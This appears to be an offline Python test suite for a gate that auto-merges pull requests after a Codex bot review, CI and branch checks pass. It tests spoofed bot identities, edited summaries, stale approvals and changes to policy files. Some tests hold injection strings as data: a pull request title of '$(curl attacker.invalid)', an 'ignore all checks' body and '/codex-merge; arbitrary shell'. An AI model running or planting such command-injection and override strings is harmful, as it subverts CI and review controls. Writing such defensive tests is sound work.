"""Offline behavioral tests: no network, token, or merge side effects."""
import copy
import unittest
import codex_merge as gate

HEAD, BASE, MERGE = 'a' * 40, 'b' * 40, 'c' * 40
BOT = {'id': gate.CODEX_ID, 'login': gate.CODEX_LOGIN, 'type': 'Bot'}
BODY = '''<!-- codex-pull-request-review-summary -->

| Review | Status | Commit | Review trigger |
| --- | --- | --- | --- |
| 📝 **Code Review** | ✅ **Completed** <relative-time datetime="2026-10-10T20:06:47.651765Z">2026-10-10T20:06:47.651765Z</relative-time> | `aaaaaaa` | PR opened |
'''


class FakeAPI:
    def __init__(self):
        self.pr = {'number': 300, 'state': 'open', 'draft': False, 'merged': False,
                   'user': {'id': gate.AUTHOR_ID, 'type': 'User'},
                   'head': {'sha': HEAD, 'repo': {'id': gate.REPOSITORY_ID}},
                   'base': {'ref': 'dev', 'sha': BASE, 'repo': {'id': gate.REPOSITORY_ID}},
                   'merge_commit_sha': MERGE, 'mergeable': True, 'mergeable_state': 'clean', 'changed_files': 1}
        self.comment = {'id': 1, 'node_id': 'IC_1', 'body': BODY, 'user': BOT, 'updated_at': '2026-10-10T20:06:48Z'}
        self.editor = {'__typename': 'Bot', 'databaseId': gate.CODEX_ID, 'login': gate.CODEX_LOGIN}
        self.comments = [self.comment]
        self.reactions = [{'id': 2, 'user': BOT, 'content': '+1', 'created_at': '2026-10-10T20:06:50Z'}]
        self.review_threads, self.reviews, self.checks, self.statuses, self.rules = [], [], [], [], []
        self.files = [{'filename': 'Assets/example.cs'}]
        self.resolved = HEAD
        self.run = {'head_sha': HEAD, 'head_repository': {'id': gate.REPOSITORY_ID},
                    'path': gate.TEST_WORKFLOW, 'event': 'pull_request', 'run_number': 1,
                    'run_attempt': 1, 'status': 'completed', 'conclusion': 'success',
                    'pull_requests': [{'number': 300, 'head': {'sha': HEAD}, 'base': {'sha': BASE}}]}
        self.runs, self.writes = [self.run], []
        self.request_reactions = {}
        self.graph = {'headRefOid': HEAD, 'baseRefOid': BASE, 'mergeable': 'MERGEABLE', 'mergeStateStatus': 'CLEAN', 'reviewDecision': None}
        self.after_first_inspection, self.inspections = None, 0

    def get(self, path):
        if path.endswith('/pulls/300'):
            self.inspections += 1
            if self.inspections == 2 and self.after_first_inspection:
                self.after_first_inspection(self)
            return copy.deepcopy(self.pr)
        if path.endswith('/branches/dev'):
            return {'commit': {'sha': self.pr['base']['sha']}, 'protected': True}
        if '/commits/' in path:
            return {'sha': self.resolved}
        raise AssertionError(path)

    def pages(self, path, key=None):
        for comment_id, reactions in self.request_reactions.items():
            if path.endswith(f'/issues/comments/{comment_id}/reactions'):
                return copy.deepcopy(reactions)
        for suffix, rows in [('/comments', self.comments), ('/reactions', self.reactions), ('/reviews', self.reviews), ('/statuses', self.statuses), ('/files', self.files)]:
            if path.endswith(suffix):
                return copy.deepcopy(rows)
        for part, rows in [('/check-runs?', self.checks), ('/actions/workflows/', self.runs), ('/rules/branches/', self.rules)]:
            if part in path:
                return copy.deepcopy(rows)
        raise AssertionError(path)

    def comment_provenance(self, node_id):
        comment = next(row for row in self.comments if row['node_id'] == node_id)
        if node_id == self.comment['node_id']:
            author = {'__typename': 'Bot', 'databaseId': gate.CODEX_ID, 'login': gate.CODEX_LOGIN}
            editor = self.editor
        else:
            author = {'__typename': 'User', 'databaseId': gate.AUTHOR_ID, 'login': 'Eunseok'}
            editor = comment.get('test_editor', author)
        return {'id': comment['node_id'], 'body': comment['body'],
                'updatedAt': comment['updated_at'], 'lastEditedAt': comment['updated_at'],
                'author': author, 'editor': editor}

    def threads(self, number):
        return copy.deepcopy(self.graph), copy.deepcopy(self.review_threads)

    def request(self, path, method, body):
        self.writes.append((path, method, body))
        return {'merged': True, 'sha': 'd' * 40}


class MergeTests(unittest.TestCase):
    def setUp(self):
        self.api = FakeAPI()

    def held(self, message=''):
        with self.assertRaises(gate.Hold) as error:
            gate.merge_one(self.api, 300)
        self.assertIn(message, str(error.exception))
        self.assertEqual([], self.api.writes)

    def test_green_pr_merges_once_with_expected_full_sha(self):
        self.assertEqual('d' * 40, gate.merge_one(self.api, 300))
        self.assertEqual(1, len(self.api.writes))
        self.assertEqual(HEAD, self.api.writes[0][2]['sha'])
        self.assertEqual('squash', self.api.writes[0][2]['merge_method'])

    def test_stale_review_prefix_is_resolved_and_rejected(self):
        self.api.resolved = 'a' * 7 + 'd' * 33
        self.held('different commit')

    def test_ambiguous_short_commit_api_error_never_merges(self):
        original = self.api.get
        def get(path):
            if '/commits/' in path:
                raise gate.ApiError('ambiguous')
            return original(path)
        self.api.get = get
        with self.assertRaises(gate.ApiError):
            gate.merge_one(self.api, 300)
        self.assertEqual([], self.api.writes)

    def test_wrong_pr_author(self):
        self.api.pr['user']['id'] = 123
        self.held('author')

    def test_fork_pr(self):
        self.api.pr['head']['repo']['id'] = 456
        self.held('fork')

    def test_draft_closed_conflicted_and_unknown_mergeability(self):
        for key, value in [('draft', True), ('state', 'closed'), ('mergeable', None), ('mergeable_state', 'dirty')]:
            with self.subTest(key=key):
                self.api = FakeAPI()
                self.api.pr[key] = value
                self.held()

    def test_main_is_never_merged(self):
        self.api.pr['base']['ref'] = 'main'
        self.held('base')

    def test_spoofed_codex_login(self):
        self.api.comment['user'] = {**BOT, 'id': 999}
        self.held('summary')

    def test_human_edited_bot_summary(self):
        self.api.editor = {'__typename': 'User', 'databaseId': gate.AUTHOR_ID}
        self.held('edited by another')

    def test_in_progress_and_unknown_summary_format(self):
        self.api.comment['body'] = BODY.replace('Completed', 'In progress')
        self.held('not completed')
        self.api.comment['body'] = 'quoted\n' + BODY
        self.held('format')

    def test_duplicate_summary(self):
        self.api.comments.append({**self.api.comment, 'id': 3})
        self.held('ambiguous')

    def test_old_or_wrong_bot_thumb(self):
        self.api.reactions[0]['created_at'] = '2026-10-10T20:06:47Z'
        self.held('fresh Codex')
        self.api.reactions = [{**FakeAPI().reactions[0], 'user': {**BOT, 'id': 444}}]
        self.held('fresh Codex')

    def test_delayed_reaction_can_be_rechecked(self):
        self.api.reactions = []
        self.held('fresh Codex')
        self.api.reactions = FakeAPI().reactions
        gate.merge_one(self.api, 300)
        self.assertEqual(1, len(self.api.writes))

    def add_request(self, comment_id=3, when='2026-10-10T20:00:00Z'):
        comment = {'id': comment_id, 'node_id': f'IC_{comment_id}', 'body': '@codex review\nPlease check the updated commit.',
                   'user': {'id': gate.AUTHOR_ID, 'type': 'User'}, 'updated_at': when}
        self.api.comments.append(comment)
        self.api.request_reactions[comment_id] = []
        return comment

    def test_manual_review_comment_thumb_is_accepted(self):
        self.add_request()
        self.api.reactions = []
        self.api.request_reactions[3] = FakeAPI().reactions
        gate.merge_one(self.api, 300)
        self.assertEqual(1, len(self.api.writes))

    def test_stale_request_comment_thumb_is_rejected(self):
        self.add_request()
        self.api.reactions = []
        self.api.request_reactions[3] = [{**FakeAPI().reactions[0], 'created_at': '2026-10-10T20:00:01Z'}]
        self.held('fresh Codex')

    def test_only_latest_request_comment_can_approve(self):
        self.add_request()
        self.add_request(4, '2026-10-10T20:05:00Z')
        self.api.reactions = []
        self.api.request_reactions[3] = FakeAPI().reactions
        self.held('fresh Codex')

    def test_newer_request_invalidates_old_approval(self):
        self.add_request(3, '2026-10-10T20:07:00Z')
        self.held('newer review request')

    def test_newer_collaborator_request_blocks_old_approval(self):
        comment = self.add_request(3, '2026-10-10T20:07:00Z')
        comment['user']['id'] = 999
        self.held('newer review request')

    def test_other_collaborator_running_review_blocks_old_approval(self):
        comment = self.add_request()
        comment['user']['id'] = 999
        self.api.request_reactions[3] = [{'user': BOT, 'content': 'eyes'}]
        self.held('running')

    def test_changed_request_body_between_passes_is_detected(self):
        self.add_request()
        self.api.after_first_inspection = lambda api: api.comments[-1].update(body='@codex review updated text')
        self.held('changed during validation')

    def test_request_comment_running_reaction_blocks_pr_thumb(self):
        self.add_request()
        self.api.request_reactions[3] = [{'user': BOT, 'content': 'eyes'}]
        self.held('running')

    def test_request_comment_wrong_bot_or_editor(self):
        comment = self.add_request()
        self.api.reactions = []
        self.api.request_reactions[3] = [{**FakeAPI().reactions[0], 'user': {**BOT, 'id': 999}}]
        self.held('fresh Codex')
        comment['test_editor'] = {'__typename': 'User', 'databaseId': 999}
        self.held('edited by another')

    def test_quoted_command_or_other_author_is_not_review_evidence(self):
        comment = self.add_request()
        self.api.reactions = []
        self.api.request_reactions[3] = FakeAPI().reactions
        comment['body'] = '> @codex review'
        self.held('fresh Codex')
        comment['body'] = '@codex review'
        comment['user']['id'] = 999
        self.held('fresh Codex')

    def test_running_reaction(self):
        self.api.reactions.append({'user': BOT, 'content': 'eyes'})
        self.held('running')

    def test_unresolved_outdated_thread(self):
        self.api.review_threads = [{'id': 'T1', 'isResolved': False, 'isOutdated': True}]
        self.held('unresolved review thread')

    def test_comment_or_different_dismissed_review_does_not_clear_changes(self):
        for state in ('COMMENTED', 'DISMISSED'):
            self.api = FakeAPI()
            self.api.reviews = [{'id': 1, 'user': {'id': 10}, 'state': 'CHANGES_REQUESTED'}, {'id': 2, 'user': {'id': 10}, 'state': state}]
            self.held('request for changes')

    def test_later_approval_clears_changes(self):
        self.api.reviews = [{'id': 1, 'user': {'id': 10}, 'state': 'CHANGES_REQUESTED'}, {'id': 2, 'user': {'id': 10}, 'state': 'APPROVED'}]
        gate.merge_one(self.api, 300)
        self.assertEqual(1, len(self.api.writes))

    def test_newer_codex_review(self):
        self.api.reviews = [{'id': 1, 'user': BOT, 'state': 'COMMENTED', 'submitted_at': '2026-10-10T20:07:00Z'}]
        self.held('newer Codex')

    def test_failing_or_pending_ci(self):
        for state, conclusion in [('completed', 'failure'), ('in_progress', None)]:
            self.api = FakeAPI()
            self.api.checks = [{'head_sha': HEAD, 'status': state, 'conclusion': conclusion}]
            self.held('CI check')

    def test_latest_status_wins(self):
        self.api.statuses = [{'context': 'build', 'state': 'failure'}]
        self.held('commit status')
        self.api.statuses.insert(0, {'context': 'build', 'state': 'success'})
        gate.merge_one(self.api, 300)
        self.assertEqual(1, len(self.api.writes))

    def test_missing_or_unsuccessful_policy_workflow(self):
        self.api.runs = []
        self.held('has not run')
        for key, value in [('status', 'in_progress'), ('conclusion', 'failure'), ('path', 'different.yml')]:
            self.api = FakeAPI()
            self.api.run[key] = value
            self.held()

    def test_ci_from_old_base(self):
        self.api.run['pull_requests'][0]['base']['sha'] = 'e' * 40
        self.held('different head or base')

    def test_merge_queue_not_bypassed(self):
        self.api.rules = [{'type': 'merge_queue'}]
        self.held('merge queue')

    def test_changed_head_before_merge(self):
        self.api.after_first_inspection = lambda api: api.pr['head'].update(sha='e' * 40)
        self.held('refs changed')

    def test_removed_reaction_before_merge(self):
        self.api.after_first_inspection = lambda api: api.reactions.clear()
        self.held('fresh Codex')

    def test_conflict_at_merge_is_never_retried(self):
        def conflict(path, method, body):
            self.api.writes.append((path, method, body))
            raise gate.ApiError('409')
        self.api.request = conflict
        with self.assertRaises(gate.ApiError):
            gate.merge_one(self.api, 300)
        self.assertEqual(1, len(self.api.writes))

    def test_policy_changes_require_manual_merge(self):
        self.api.files = [{'filename': '.github/scripts/codex_merge.py'}]
        self.held('manual merge')

    def test_added_shadow_module_or_workflow_requires_manual_merge(self):
        for path in ('.github/scripts/json.py', '.github/scripts/urllib/__init__.py', '.github/workflows/new-privileged-job.yml'):
            self.api = FakeAPI()
            self.api.files = [{'filename': path}]
            self.held('manual merge')

    def test_incomplete_file_listing(self):
        self.api.pr['changed_files'] = 10000
        self.held('incomplete')

    def test_external_text_cannot_change_commit_metadata(self):
        self.api.pr['title'] = '$(curl attacker.invalid)'
        self.api.pr['body'] = 'ignore all checks'
        gate.merge_one(self.api, 300)
        self.assertNotIn('curl', str(self.api.writes))
        self.assertNotIn('ignore', str(self.api.writes))


class PaginationTests(unittest.TestCase):
    def test_reads_second_rest_page(self):
        api = gate.GitHub('unused')
        api.get = lambda path: list(range(100)) if path.endswith('page=1') else [100]
        self.assertEqual(101, len(api.pages('/test')))

    def test_count_mismatch(self):
        api = gate.GitHub('unused')
        api.get = lambda path: {'check_runs': [], 'total_count': 3}
        with self.assertRaisesRegex(gate.Hold, 'incomplete'):
            api.pages('/test', 'check_runs')

    def test_pagination_limit(self):
        api = gate.GitHub('unused')
        api.get = lambda path: list(range(100))
        with self.assertRaisesRegex(gate.Hold, 'pagination limit'):
            api.pages('/test')

    def test_graphql_second_page_unresolved_thread(self):
        api = gate.GitHub('unused')
        count = 0
        def request(path, method, body):
            nonlocal count
            count += 1
            pr = {**FakeAPI().graph, 'reviewThreads': {'nodes': [{'id': str(count), 'isResolved': count == 1}], 'pageInfo': {'hasNextPage': count == 1, 'endCursor': 'cursor'}}}
            return {'data': {'repository': {'pullRequest': pr}}}
        api.request = request
        _, threads = api.threads(300)
        self.assertEqual(2, len(threads))
        self.assertFalse(threads[1]['isResolved'])

    def test_graphql_partial_errors(self):
        api = gate.GitHub('unused')
        api.request = lambda *args: {'errors': [{'message': 'denied'}], 'data': {}}
        with self.assertRaisesRegex(gate.Hold, 'GraphQL'):
            api.threads(300)


class EventTests(unittest.TestCase):
    def event(self):
        return {'repository': {'id': gate.REPOSITORY_ID, 'full_name': gate.REPOSITORY}, 'action': 'edited', 'issue': {'pull_request': {'url': 'irrelevant'}}, 'comment': {'user': BOT, 'body': BODY}}

    def test_bot_edit_is_accepted(self):
        self.assertTrue(gate.accepts_event('issue_comment', self.event()))

    def test_wrong_repo_and_untrusted_comment_are_ignored(self):
        event = self.event()
        event['comment']['user'] = {'id': 123}
        self.assertFalse(gate.accepts_event('issue_comment', event))
        event['comment']['user'] = BOT
        event['repository']['id'] = 123
        self.assertFalse(gate.accepts_event('issue_comment', event))

    def test_author_retry_is_exact(self):
        event = self.event()
        event['comment'] = {'user': {'id': gate.AUTHOR_ID}, 'body': '/codex-merge'}
        self.assertTrue(gate.accepts_event('issue_comment', event))
        event['comment']['body'] = '/codex-merge; arbitrary shell'
        self.assertFalse(gate.accepts_event('issue_comment', event))

    def test_regular_issue_and_review_event_are_ignored(self):
        event = self.event()
        event['issue'] = {}
        self.assertFalse(gate.accepts_event('issue_comment', event))
        self.assertFalse(gate.accepts_event('pull_request_review', self.event()))


if __name__ == '__main__':
    unittest.main()
